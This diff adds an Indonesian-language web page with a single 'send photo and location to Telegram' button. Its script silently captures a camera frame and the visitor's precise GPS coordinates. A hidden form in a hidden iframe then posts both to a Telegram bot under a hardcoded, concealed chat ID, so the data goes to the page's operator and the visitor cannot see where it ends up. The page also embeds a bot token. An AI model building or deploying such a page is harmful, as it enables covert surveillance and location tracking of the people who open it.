@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Kirim Foto & Lokasi Telegram</title>
+<style>
+  body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial; background:#f6f8fb; margin:0; padding:24px; display:flex; justify-content:center; align-items:center; height:100vh;}
+  .card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 6px 20px rgba(30,30,60,0.06);text-align:center;}
+  button{background:#0b5;color:#fff;border:0;padding:12px 20px;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;}
+  #status{margin-top:16px;color:#222;font-size:14px;}
+  video, canvas, input[type="file"], iframe{display:none !important;}
+</style>
+</head>
+<body>
+<div class="card">
+  <button id="sendBtn">Kirim Foto & Lokasi ke Telegram</button>
+  <div id="status">Status: Menunggu aksi</div>
+</div>
+
+<!-- tersembunyi -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+<iframe name="hidden_iframe"></iframe>
+<form id="tgForm" action="" method="POST" enctype="multipart/form-data" target="hidden_iframe">
+  <input type="hidden" name="chat_id" value="7117457900">
+  <input type="hidden" name="caption" id="caption">
+  <input type="file" name="photo" id="photoField">
+</form>
+
+<script>
+const BOT_TOKEN = "AAHEaRozfI9atO1zPZcIMFdKyHd4-P-ipMY";
+const CHAT_ID = "8168680326";
+
+const sendBtn = document.getElementById('sendBtn');
+const statusEl = document.getElementById('status');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const photoField = document.getElementById('photoField');
+const tgForm = document.getElementById('tgForm');
+const captionInput = document.getElementById('caption');
+
+tgForm.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+function setStatus(txt, color){ statusEl.textContent="Status: "+txt; statusEl.style.color=color||"#222"; }
+
+async function getLocation(options={enableHighAccuracy:true,timeout:8000,maximumAge:0}){
+  return new Promise((res,rej)=>{
+    if(!navigator.geolocation) return rej("Geolocation tidak didukung");
+    navigator.geolocation.getCurrentPosition(pos=>res({lat:pos.coords.latitude,lon:pos.coords.longitude}),err=>rej(err),options);
+  });
+}
+
+async function captureAndSend(){
+  setStatus("Memulai kamera...");
+  let stream;
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+    video.srcObject = stream;
+  }catch(e){
+    setStatus("Gagal akses kamera: "+e,"#c00"); return;
+  }
+
+  await new Promise(r=>setTimeout(r,500));
+  // ambil foto
+  canvas.width = video.videoWidth || 1280;
+  canvas.height = video.videoHeight || 720;
+  canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+
+  // ambil lokasi
+  let loc=null;
+  try{ loc = await getLocation(); }catch(e){ loc=null; }
+
+  // buat file dari canvas
+  await new Promise(res=>{
+    canvas.toBlob(blob=>{
+      if(!blob){ setStatus("Gagal membuat foto","#c00"); res(); return; }
+      const file = new File([blob],`capture_${Date.now()}.jpg`,{type:'image/jpeg'});
+      const dt = new DataTransfer();
+      dt.items.add(file);
+      photoField.files = dt.files;
+
+      // isi caption
+      if(loc) captionInput.value = `Lokasi: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}\nhttps://maps.google.com/?q=${loc.lat},${loc.lon}`;
+      else captionInput.value = "Foto dikirim tanpa lokasi.";
+      res();
+    },'image/jpeg',0.92);
+  });
+
+  // kirim ke telegram
+  setStatus("Mengirim ke Telegram...");
+  try{ tgForm.submit(); setStatus("Dikirim!","#0a0"); }catch(e){ setStatus("Gagal kirim: "+e.message,"#c00"); }
+
+  // hentikan kamera
+  stream.getTracks().forEach(t=>t.stop());
+}
+
+sendBtn.addEventListener('click',captureAndSend);
+</script>
+</body>
+</html>
